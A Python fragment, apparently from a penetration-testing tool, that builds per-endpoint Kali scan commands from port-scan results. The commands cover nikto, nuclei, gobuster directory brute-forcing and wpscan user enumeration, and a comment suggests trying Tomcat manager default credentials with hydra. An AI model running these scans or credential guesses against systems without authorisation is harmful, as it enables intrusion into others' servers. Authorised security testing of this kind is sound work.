            wv = [v for v in h.vulns if v.port == p.portid and v.source == "web"]
            tech = " ".join(t for t in (p.product, p.version, p.extrainfo) if t)
            out.append({"ip": h.ip, "hostname": h.hostname, "port": p.portid,
                        "url": url_for(h.ip, p), "scheme": scheme_for(p),
                        "tech": tech or p.service or "http", "findings": len(wv),
                        "commands": bridge_commands(url_for(h.ip, p), tech, p)})
    return out


def bridge_commands(url: str, tech: str, port: Port) -> str:
    """The exact Kali deep-scan commands for an endpoint, tailored to its stack."""
    host_port = url.split("://", 1)[-1]
    cmds = [f"whatweb -a3 {url}",
            f"nuclei -u {url}",
            f"nikto -h {url}",
            f"gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak"]
    low = f"{tech} {url}".lower()
    if "wordpress" in low:
        cmds.append(f"wpscan --url {url} --enumerate p,t,u")
    if "tomcat" in low or ":8080" in url:
        cmds.append(f"nxc http {host_port.split(':')[0]} -M tomcat  # or hydra manager default creds")
    if probes._is_tls(port):
        cmds.append(f"sslscan {host_port}")
    return "  ;  ".join(cmds)
